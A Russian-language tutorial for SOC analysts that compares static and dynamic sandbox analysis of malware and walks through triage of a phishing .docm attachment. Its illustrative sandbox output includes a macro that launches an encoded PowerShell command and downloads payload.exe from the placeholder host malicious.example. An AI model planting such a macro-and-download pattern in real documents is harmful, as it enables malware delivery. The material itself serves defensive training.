# Статический и динамический анализ вредоносного ПО в песочнице: методы, сравнение, практика

## 1. Контекст и разграничение методов анализа

Статический анализ — это исследование подозрительного файла или артефакта без его выполнения в целевой среде. Вся работа ведётся на уровне структуры бинарного кода, метаданных, текстовых строк и импортируемых библиотек. Динамический анализ, напротив, требует запуска образца в контролируемой изолированной среде (песочнице) и отслеживания его реального поведения: изменений файловой системы, операций реестра, сетевых соединений, взаимодействия с памятью и процессами.

Оба подхода являются взаимодополняющими элементами анализа вредоносного ПО (ВПО). В инфраструктуре SOC песочница уровня L1/L2 встраивается в конвейер обработки подозрительных объектов: сначала выполняется автоматический статический скрининг для быстрой отбраковки известных угроз, затем — детонация и поведенческий анализ неизвестных или обфусцированных образцов. Это позволяет системе выдавать обоснованный вердикт с минимальным участием человека.

### 1.1. Место в экосистеме SOC

Песочница не заменяет антивирус или EDR, а дополняет их. Если антивирус действует по сигнатурам уже известных угроз, а EDR фокусируется на поведенческих паттернах на конечных точках, то песочница способна выявлять угрозы нулевого дня и целенаправленные атаки, которые не оставляют сигнатур на диске и не проявляются в логах агентов до момента детонации. Именно комбинация статического и динамического анализа внутри песочницы позволяет формировать детальный вердикт и автоматически генерировать индикаторы компрометации (IoC) для других средств защиты [blog.infra-tech.ru](https://blog.infra-tech.ru/sandbox).

### 1.2. Сравнение статического и динамического анализа

Для чёткого разграничения обеих методик приведена таблица, отражающая ключевые различия по наиболее значимым для аналитика SOC критериям.

| Критерий | Статический анализ | Динамический анализ |
|----------|-------------------|---------------------|
| Необходимость выполнения | Не требуется; файл не запускается | Требуется запуск в изолированной среде (песочнице) |
| Скорость | Высокая: от долей секунды до нескольких минут | Низкая: наблюдение может занимать минуты-часы |
| Объект исследования | Структура файла, заголовки, строки, импорты, дизассемблированный код | Поведение процесса: файловые операции, сетевые соединения, реестр, память |
| Устойчивость к обфускации | Низкая: упаковка, шифрование, полиморфизм скрывают статические признаки | Высокая: распаковка и дешифрование происходят в памяти, и поведение проявляется |
| Риск пропуска | Пропускает образцы, активирующиеся по условиям (триггеры, логические бомбы) | Пропускает образцы с антианалитическими проверками (песочница, ВМ, таймеры) |
| Типовой выходной артефакт | Хеш-суммы, сигнатуры YARA, список импортов, подозрительные строки | Дамп сетевого трафика, лог API-вызовов, изменения реестра, дерево процессов |
| Основные инструменты | `strings`, `FLOSS`, PEStudio, Detect It Easy, IDA Pro, Ghidra, YARA | Cuckoo Sandbox, ANY.RUN, Joe Sandbox, PT Sandbox, ProcMon, Wireshark |
| Роль в SOC | Быстрый триаж, исключение известного чистого ПО, подготовка к динамическому анализу | Подтверждение вредоносности, извлечение поведенческих IoC, построение отчёта |

Эта таблица демонстрирует, что ни один из подходов не может считаться универсальным. В реальной работе песочница выполняет статический анализ на этапе поступления файла, а затем при необходимости переходит к динамической детонации. Гибридные схемы, объединяющие оба метода, сводят к минимуму вероятность пропуска как зашифрованных, так и «спящих» угроз [networkershome.com](https://www.networkershome.com/fundamentals/cybersecurity/malware-analysis-basics-types-behavior-sandboxing).

## 2. Внутреннее устройство: техники и артефакты обеих методик

Понимание того, какие конкретные техники скрываются за ярлыками «статический» и «динамический», необходимо для корректной интерпретации отчётов песочницы. Ниже детально рассмотрены составляющие каждого метода, а также то, как они реализованы в современных песочницах.

### 2.1. Техники статического анализа

Статический анализ оперирует артефактами, извлечёнными непосредственно из файла. В порядке нарастания сложности обычно выделяют:

- **Сигнатурный анализ**: вычисление хеша (MD5, SHA-1, SHA-256) и сравнение с базами известного ВПО. Используется для быстрого детектирования уже классифицированных угроз. Неэффективен при малейшем изменении образца.
- **Анализ заголовков исполняемых файлов**: для PE-формата извлекаются секции (особенно энтропия .text, .data), точка входа, таблица импортов. Упакованные файлы часто имеют высокую энтропию или нетипичные имена секций (например, UPX0). Инструменты: PEStudio, CFF Explorer, `pecheck`.
- **Извлечение строк**: команды `strings` или более продвинутые утилиты вроде FLOSS, которые умеют декодировать обфусцированные и stack-строки. Среди строк ищут URL, IP-адреса, пути к файлам, названия ключей реестра, имена командных серверов.
- **Декомпозиция и дизассемблирование**: анализ дизассемблированного кода с помощью IDA Pro, Ghidra или Radare2. Позволяет восстановить логику работы, алгоритмы шифрования, механизмы обхода песочницы. Применяется вручную при глубоком разборе образца.
- **Статический анализ скриптов и документов**: для офисных файлов с макросами (VBA) извлекается исходный код макроса, команды PowerShell, URL. Песочницы, такие как ANY.RUN, отображают эти данные в своём статическом модуле ещё до запуска [thehackernews.com](https://thehackernews.com/2024/04/how-to-conduct-advanced-static-analysis.html).

Большинство этих техник автоматизировано в песочницах начального уровня. SOC-аналитик видит уже агрегированный результат, например список подозрительных строк, обнаруженные сигнатуры или импорты, ассоциированные с вредоносной деятельностью.

### 2.2. Техники динамического анализа

Динамический анализ разворачивается после помещения образца в изолированную среду. Основные наблюдаемые категории поведения:

- **Файловая активность**: создание, удаление, переименование файлов; шифрование (в случае шифровальщиков); обращение к конфиденциальным директориям.
- **Реестр Windows**: модификация ключей автозапуска, изменение ассоциаций файлов, внедрение в ветви AppInit_DLLs, Winlogon.
- **Процессы и память**: создание дочерних процессов (часто `cmd.exe`, `powershell.exe`), инжекции кода в легитимные процессы, выделение памяти с правами на исполнение (PAGE_EXECUTE_READWRITE).
- **Сетевые соединения**: установка TCP-сессий к подозрительным IP/URL, DNS-запросы к доменам, типичным для C2, попытки сканирования портов.
- **API-вызовы**: мониторинг функций WinAPI, ответственных за криптографию, сеть, управление процессами. Захватываются аргументы и возвращаемые значения.
- **Эвристический анализ поведения**: выявление последовательностей действий, характерных для конкретных классов ВПО (например, троян-загрузчик: скачивание файла, запись в TEMP, запуск).

Современные песочницы фиксируют эти артефакты с помощью агентов внутри гостевой ОС, драйверов фильтрации файловой системы, перехвата API и виртуального сетевого анализатора. Полученный сырой поток событий конвертируется в тактики MITRE ATT&CK и формирует поведенческий вердикт [simplysecuregroup.com](https://simplysecuregroup.com/top-10-best-dynamic-malware-analysis-tools-in-2026).

### 2.3. Сопоставительная карта техник

Для наглядности различий в детектирующих возможностях каждой техники составлена расширенная таблица.

| Уровень анализа | Статическая техника | Динамическая техника | On what it catches |
|-----------------|---------------------|----------------------|-------------------|
| Сеть | Строки с URL/IP | Запись сетевых сессий, PCAP | C2-коммуникации, exfiltration |
| Персистентность | Поиск строк реестра, импорт `RegSetValueEx` | Лог изменений ключей реестра | Автозагрузка, Winlogon helper |
| Упаковка/обфускация | Анализ энтропии секций, детектирование упаковщиков | Распаковка в памяти, перехват функций декодирования | Полиморфные образцы, crypter |
| Инжекции кода | Импорт функций `VirtualAllocEx`, `WriteProcessMemory` | Мониторинг создания удалённых потоков, APC | Process hollowing, DLL injection |
| Эксплойты документов | Извлечение макросов, JavaScript из PDF | Детонация в офисном приложении, запуск дочерних процессов | Макровирусы, фишинговые документы |
| Антианализ | Обнаружение вызовов `IsDebuggerPresent`, `NtQuerySystemInformation` | Проверка на наличие инструментов анализа в окружении песочницы | Байты, чувствительные к среде |

Такая двойная сетка показывает, что статические и динамические методы нацелены на одни и те же вредоносные тактики, но через разные слои данных. Эффективная песочница объединяет оба слоя в единую пайплайну анализа, что снижает риск пропуска угрозы из-за особенностей конкретного метода [ampcuscyber.com](https://www.ampcuscyber.com/knowledge-hub/what-is-malware-analysis).

## 3. Применение в повседневной работе SOC L1

Аналитик первого уровня редко запускает дизассемблер или вручную настраивает виртуальную машину. Его основная задача — оперативно определить, является ли поступивший объект вредоносным, и принять решение об эскалации. Работа со statическим и динамическим анализом встроена в типовой конвейер обработки инцидента.

### 3.1. Типовой конвейер обработки подозрительного файла

1. **Получение артефакта**: письмо с вложением, файл, загруженный из интернета, архив из DMZ. Аналитик фиксирует источник.
2. **Быстрый статический скрининг**: автоматически вычисляются хеш-суммы, которые проверяются по VirusTotal или локальной базе; извлекаются сигнатуры YARA. Если образец известен как чистый, дальнейшие шаги могут быть сокращены.
3. **Статический анализ в песочнице**: файл загружается в песочницу, где выполняются более глубокие статические проверки: анализ заголовков, строк, макросов. Результаты отображаются в консоли аналитика.
4. **Детонация**: если статический анализ не дал однозначного вердикта, инициируется динамический прогон в песочнице. Образец помещается в изолированную ВМ с имитацией пользовательской активности (клики, ввод данных), чтобы спровоцировать вредоносное поведение.
5. **Анализ отчёта песочницы**: SOC-инженер изучает автоматически сгенерированный отчёт: дерево процессов, сетевые сессии, изменения реестра, оценки вредоносности (score от 1 до 100). На основе этого принимается решение – закрыть алерт как ложный, заблокировать IOC на межсетевом экране или эскалировать инцидент.
6. **Документирование и обратная связь**: найденные IOC (хэши, IP, домены, имена файлов) заносятся в базу, сигнатуры обновляются.

### 3.2. Работа с конкретными инструментами

Рассмотрим практические фрагменты, с которыми сталкивается аналитик.

**Статический анализ через CLI.** Быстрая проверка подозрительного файла `unknown.dll` может включать:

```bash
# Получение хэша
sha256sum unknown.dll

# Извлечение строк с фильтрацией по URL
strings -n 6 unknown.dll | grep -E 'https?://'

# Получение информации о PE-заголовках и импортах с помощью pecheck
pecheck -i unknown.dll
```

Вывод `pecheck` покажет секции, точку входа и импортируемые функции. Например, наличие вызовов `WinExec`, `Sleep`, `VirtualAlloc` в комбинации с подозрительным URL в строках — сильный индикатор вредоносности, даже без запуска.

**Динамический анализ через API песочницы.** Многие корпоративные песочницы предоставляют REST API для автоматизации. Типовой запрос на детонацию файла в Cuckoo Sandbox:

```bash
curl -F file=@/path/to/malware.exe http://cuckoo.local:8090/tasks/create/file
```

Ответ содержит `task_id`, по которому затем можно запросить отчёт:

```json
{
  "task_id": 42,
  "status": "running"
}
```

После завершения детонации анализ результатов осуществляется программно: из JSON-отчёта извлекаются разделы `network.tcp`, `signatures`, `behavior.processes`. SOC-аналитик может не писать скрипты, но готовые интеграции SIEM с песочницей отображают эти данные в удобном виде.

**Использование статического модуля ANY.RUN.** Облачный сервис ANY.RUN предоставляет детальный статический анализ до запуска. Например, для файла `.lnk` может быть немедленно выявлена вредоносная команда:

```json
"static": {
  "lnk": {
    "command_line_arguments": "C:\\Windows\\System32\\cmd.exe /c powershell -enc SQBFAFgA...",
    "target": "cmd.exe"
  }
}
```

Такой метод позволяет заблокировать угрозу ещё до детонации [thehackernews.com](https://thehackernews.com/2024/04/how-to-conduct-advanced-static-analysis.html).

### 3.3. Типичные ошибки и ловушки

- **Доверие только статическому вердикту**: вредонос может быть совершенно новым или сильно обфусцированным, что приводит к ложноположительному заключению «чистый». Всегда необходимо динамическое подтверждение при низком доверии статики.
- **Неверная настройка окружения**: песочница без доступа в Интернет не увидит C2-активность; отсутствие эмуляции действий пользователя может не дать сработать триггерам.
- **Эскалация на основе сырых артефактов**: единичное сетевое соединение или создание процесса не всегда вредоносны. Важен контекст и оценка риска.
- **Игнорирование статического анализа макросов**: офисные документы часто содержат вредоносные макросы, которые песочница может раскрыть статически; упущение этого этапа замедляет реакцию.

Построение эффективного процесса требует сбалансированного применения обоих методов и чётких правил эскалации.

## 4. Сквозной практический пример: триаж фишингового вложения в SOC

### Исходные условия

Аналитик SOC L1 получает оповещение от почтового шлюза: во вложении письма находится документ `invoice.docm`, который не был опознан антивирусной системой. Рабочая станция аналитика — Linux, доступ к веб-интерфейсу корпоративной песочницы (на базе Cuckoo с интеграцией внешнего облачного анализа) и к CLI-инструментам. Задача: определить, является ли файл вредоносным, и извлечь индикаторы компрометации.

### Шаг 1: статический первичный анализ

Первым делом вычисляются хеш-суммы, чтобы проверить образец по локальной базе и VirusTotal, а также выявить подозрительные строки.

```bash
sha256sum invoice.docm
# ожидаемый вывод: d3f4... (хеш иллюстративный)
strings -n 7 invoice.docm | grep -i "powershell"
# вывод: powershell -enc JgAgACgAIAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYA...
```

Наличие PowerShell команды с base64-кодированной нагрузкой в строках документа — признак типового фишинга. Статический анализ уже даёт серьёзное основание для углублённой проверки.

### Шаг 2: загрузка и статический модуль песочницы

Файл загружается в веб-интерфейс песочницы. Платформа мгновенно выполняет статический анализ макросов VBA:

```json
"static": {
  "macros": [
    {
      "language": "VBA",
      "commands": [
        "Shell(\"powershell -enc JgAgACgAIAAiAGgAdAB0AHAA...\")",
        "Open \"http://malicious.example/download/payload.exe\""
      ]
    }
  ]
}
```

В статическом модуле видны попытки запуска PowerShell и загрузки исполняемого файла. Этого достаточно для гипотезы о вредоносной активности.

### Шаг 3: динамическая детонация и наблюдение поведения

Аналитик инициирует детонацию документа в песочнице с эмулированным пользователем (открытие файла в Microsoft Office, разрешение макросов). Спустя несколько минут формируется отчёт. Ключевые артефакты из лога процессов и сети:

```json
"behavior": {
  "processes": [
    {
      "parent": "WINWORD.EXE",
      "command_line": "powershell -enc JgAgACgAIAAiAGgAdAB0AHAA...",
      "pid": 2048
    },
    {
      "parent": "powershell.exe",
      "command_line": "payload.exe",
      "pid": 2560
    }
  ],
  "network": {
    "tcp": [
      {
        "src_ip": "10.0.2.15",
        "dst_ip": "203.0.113.5",
        "dst_port": 443,
        "bytes_sent": 1520,
        "bytes_received": 8900
      }
    ]
  }
}
```

Динамический анализ подтвердил: макрос породил PowerShell, который скачал и запустил `payload.exe`, установивший защищённое соединение с внешним сервером.

### Шаг 4: извлечение индикаторов компрометации и эскалация

На основе статических и динамических данных формируется список IoC для блокировки и дальнейшего анализа:

- **Хеш документа**: `d3f4...`
- **Хеш загружаемого файла**: `a1b2...` (из песочницы)
- **URL загрузки**: `http://malicious.example/download/payload.exe`
- **IP-адрес C2**: `203.0.113.5`
- **Командная строка PowerShell**: `powershell -enc JgAgACgAIAAiAGgAdAB0AHAA...`

Аналитик вносит эти данные в SIEM и отправляет алерт на блокировку сетевому администратору. Инцидент классифицируется как подтверждённый фишинг с загрузкой вредоносной полезной нагрузки.
